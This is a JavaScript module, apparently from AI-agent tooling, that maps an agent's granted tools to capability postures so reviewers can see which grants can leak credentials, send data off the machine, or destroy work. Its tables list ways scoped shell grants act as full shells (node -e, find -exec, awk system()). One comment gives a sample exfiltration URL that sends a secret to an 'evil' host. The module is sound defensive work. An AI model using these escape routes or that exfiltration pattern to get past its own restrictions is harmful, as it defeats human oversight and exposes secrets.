/**
 * agent-posture — what does this agent's tool grant actually LET IT DO?
 *
 * ADR-009 ends with an instruction nobody had a way to follow: "Ask at design
 * time, when the capability is added — not after the incident." The question it
 * asks is about consequence — is this expensive to undo? — while every agent
 * file answers a different question, in a different language: which tools are on
 * the `tools:` line. Reviewing the second does not answer the first. `Bash` and
 * `Bash(node:*)` sit two characters apart and read as careful and careless; in
 * consequence they are the same grant.
 *
 * So this names the grant in the language of the decision. Vocabulary shape
 * borrowed from OpenFirma's capability postures (`credential.read`,
 * `communication.external.send`, `code.destructive`) — the idea only; that
 * project is GPL-3.0 and this one is MIT, so nothing was copied.
 *
 * NOTHING here decides anything, exactly as in `gate-reversibility.mjs`, whose
 * ADR-009 categories it reuses rather than inventing a second vocabulary for the
 * same axis. It classifies, so a reviewer can see the grant they are approving.
 */

import { CATEGORIES } from './gate-reversibility.mjs';

/**
 * The postures. Each cites the ADR-009 category that makes it expensive, or
 * `null` when the repair is simply to do the thing again.
 */
export const POSTURES = Object.freeze({
  'code.read': {
    category: null,
    means: 'read files in the working tree',
  },
  'code.write': {
    category: null,
    means: 'create or modify files — the repair is another edit',
  },
  'code.destructive': {
    category: 'destroys-evidence',
    means: 'delete files, rewrite history, or overwrite work that is not in the index',
  },
  'credential.read': {
    category: 'unrevocable-disclosure',
    means: 'reach secrets on disk or in the environment',
  },
  'communication.external.send': {
    category: 'escapes-the-machine',
    means: 'send data off this machine — a push, a publish, a request body, a URL',
  },
  'network.fetch': {
    category: null,
    means: 'pull from the network; nothing of the user\'s leaves except the request',
  },
  'process.spawn': {
    category: null,
    means: 'start a process or another agent, which then holds its own grant',
  },
  payments: {
    category: 'costs-money',
    means: 'spend money — paid API capacity or provisioned infrastructure',
  },
});

/**
 * A shell is a shell. Every posture an unrestricted `Bash` confers, in one list,
 * so the interpreters below cannot drift away from it.
 */
const FULL_SHELL = Object.freeze([
  'code.read', 'code.write', 'code.destructive',
  'credential.read', 'communication.external.send', 'network.fetch', 'process.spawn',
]);

/**
 * Bash sub-grants, by the command they scope to.
 *
 * `full: true` marks the ones that scope to a name but not to a capability — an
 * interpreter, or a command that runs other commands. `Bash(node:*)` is
 * `node -e '<anything>'`; `Bash(find:*)` is `find . -exec <anything>`;
 * `Bash(xargs:*)` and `Bash(awk:*)` likewise. These read as restrictions and are
 * not, which is the reason this file exists.
 */
const BASH_SCOPES = Object.freeze({
  // Scoped in name only — a full shell wearing a command name.
  node:    { full: true, why: 'node -e runs arbitrary JavaScript, including child_process' },
  python3: { full: true, why: 'python3 -c runs arbitrary Python, including os.system' },
  python:  { full: true, why: 'python -c runs arbitrary Python, including os.system' },
  xargs:   { full: true, why: 'xargs exists to run other commands' },
  find:    { full: true, why: 'find -exec and -delete run other commands and remove files' },
  awk:     { full: true, why: 'awk has system() and can redirect print into a file' },
  sh:      { full: true, why: 'a shell' },
  bash:    { full: true, why: 'a shell' },
  zsh:     { full: true, why: 'a shell' },
  env:     { full: true, why: 'env runs the command that follows it' },
  eval:    { full: true, why: 'eval runs the string that follows it' },

  // Genuinely narrower.
  git:    { postures: ['code.read', 'code.write', 'code.destructive', 'communication.external.send'],
            why: 'push sends the tree to a remote; checkout -- and reset --hard destroy uncommitted work' },
  npm:    { postures: ['code.read', 'code.write', 'network.fetch', 'communication.external.send', 'process.spawn'],
            why: 'install runs lifecycle scripts; publish escapes the machine' },
  bd:     { postures: ['code.read', 'code.write', 'communication.external.send'],
            why: 'bd sync pushes the task store to its remote' },
  cat:    { postures: ['code.read', 'credential.read'],
            why: 'the file it reads may be ~/.great_cto/secrets.env' },
  source: { postures: ['code.read', 'credential.read'],
            why: 'sourcing an env file puts its secrets in the environment' },
  sort:   { postures: ['code.read', 'code.write'], why: 'sort -o writes' },
  tee:    { postures: ['code.read', 'code.write'], why: 'writes what it reads' },
  rm:     { postures: ['code.destructive'], why: 'removes files' },

  ls:     { postures: ['code.read'] },
  grep:   { postures: ['code.read'] },
  wc:     { postures: ['code.read'] },
  head:   { postures: ['code.read'] },
  tail:   { postures: ['code.read'] },
  date:   { postures: ['code.read'] },
  echo:   { postures: ['code.read'] },
  printf: { postures: ['code.read'] },
  export: { postures: ['code.read'] },
  mkdir:  { postures: ['code.write'] },
  touch:  { postures: ['code.write'] },
});

/** Non-Bash tools. */
const TOOL_POSTURES = Object.freeze({
  Read: ['code.read'],
  Glob: ['code.read'],
  Grep: ['code.read'],
  Write: ['code.write'],
  Edit: ['code.write'],
  NotebookEdit: ['code.write'],
  // A URL is a channel. A fetch of `https://evil/?leak=<secret>` is a send, and
  // an agent that can read a file and reach the network can move it.
  WebFetch: ['network.fetch', 'communication.external.send'],
  WebSearch: ['network.fetch', 'communication.external.send'],
  Agent: ['process.spawn'],
  Task: ['process.spawn'],
});

/** MCP and beta tools, matched by prefix — the list of these grows monthly. */
const PREFIX_POSTURES = Object.freeze([
  [/^advisor_/,   ['network.fetch', 'communication.external.send', 'payments']],
  [/^memory_/,    ['code.read', 'code.write']],
  [/^mcp__great_cto_llm_router__/, ['network.fetch', 'communication.external.send', 'payments']],
  [/^mcp__grafana__/, ['network.fetch']],
]);

/**
 * Split a `tools:` frontmatter value into tokens. `Bash(git:*)` contains a comma
 * in no case we ship, but the split is on commas outside parentheses anyway, so
 * a future `Bash(a:*, b:*)` does not silently become two broken tokens.
 */
export function splitTools(line) {
  const out = [];
  let depth = 0; let cur = '';
  for (const ch of String(line ?? '')) {
    if (ch === '(') depth++;
    if (ch === ')') depth--;
    if (ch === ',' && depth === 0) { out.push(cur.trim()); cur = ''; continue; }
    cur += ch;
  }
  if (cur.trim()) out.push(cur.trim());
  return out.filter(Boolean);
}

/**
 * @returns {{postures:string[], unknown:boolean, fullShell:boolean, why:string}}
 *
 * THREE states for the tool itself, and `unknown` is the one that earns its
 * keep: a tool this table has never heard of grants `unknown`, never nothing.
 * A grant nobody classified must not read as a grant that was classified and
 * found harmless.
 */
export function postureOfTool(tool) {
  const t = String(tool ?? '').trim();
  if (!t) return { postures: [], unknown: true, fullShell: false, why: 'no tool given' };

  if (t === '*' || t === 'All tools') {
    return { postures: [...FULL_SHELL, 'payments'], unknown: false, fullShell: true, why: 'every tool' };
  }
  if (t === 'Bash') {
    return { postures: [...FULL_SHELL], unknown: false, fullShell: true, why: 'unrestricted shell' };
  }

  const scoped = /^Bash\(([^:)]+)/.exec(t);
  if (scoped) {
    const cmd = scoped[1].trim();
    const hit = BASH_SCOPES[cmd];
    if (!hit) {
      return {
        postures: [], unknown: true, fullShell: false,
        why: `Bash scope '${cmd}' is not in the table — treat as unjudged, not as narrow. Add it to agent-posture.mjs.`,
      };
    }
    if (hit.full) {
      return { postures: [...FULL_SHELL], unknown: false, fullShell: true, why: hit.why };
    }
    return { postures: [...hit.postures], unknown: false, fullShell: false, why: hit.why ?? '' };
  }

  if (TOOL_POSTURES[t]) {
    return { postures: [...TOOL_POSTURES[t]], unknown: false, fullShell: false, why: '' };
  }
  for (const [re, postures] of PREFIX_POSTURES) {
    if (re.test(t)) return { postures: [...postures], unknown: false, fullShell: false, why: '' };
  }
  return {
    postures: [], unknown: true, fullShell: false,
    why: `'${t}' is not in the table — treat as unjudged, not as harmless. Add it to agent-posture.mjs.`,
  };
}

/**
 * The posture of a whole `tools:` line.
 *
 * @returns {{postures:string[], expensive:string[], unknownTools:string[],
 *            fullShellVia:string[], scopedInNameOnly:string[]}}
 */
export function postureOf(toolsLine) {
  const tools = splitTools(toolsLine);
  const postures = new Set();
  const unknownTools = [];
  const fullShellVia = [];
  const scopedInNameOnly = [];

  for (const t of tools) {
    const r = postureOfTool(t);
    if (r.unknown) { unknownTools.push(t); continue; }
    for (const p of r.postures) postures.add(p);
    if (r.fullShell) {
      fullShellVia.push(t);
      // `Bash` is honest about being a shell. `Bash(node:*)` is not.
      if (t !== 'Bash' && t !== '*' && t !== 'All tools') scopedInNameOnly.push(t);
    }
  }

  const ordered = Object.keys(POSTURES).filter((p) => postures.has(p));
  return {
    postures: ordered,
    expensive: ordered.filter((p) => POSTURES[p].category),
    unknownTools,
    fullShellVia,
    scopedInNameOnly,
  };
}

/** One line for a human reviewing a grant, in their words. */
export function describePosture(r) {
  const parts = [];
  if (r.expensive.length) {
    parts.push(`expensive: ${r.expensive.map((p) => `${p} (${CATEGORIES[POSTURES[p].category]})`).join('; ')}`);
  } else if (r.postures.length) {
    parts.push(`routine: ${r.postures.join(', ')}`);
  }
  if (r.scopedInNameOnly.length) {
    parts.push(`scoped in name only: ${r.scopedInNameOnly.join(', ')} — a full shell`);
  }
  if (r.unknownTools.length) {
    parts.push(`NOT CLASSIFIED: ${r.unknownTools.join(', ')} — unjudged, not harmless`);
  }
  return parts.join(' · ') || 'no tools granted';
}

/** Every posture name, for a surface that wants a legend. */
export function knownPostures() {
  return Object.keys(POSTURES);
}
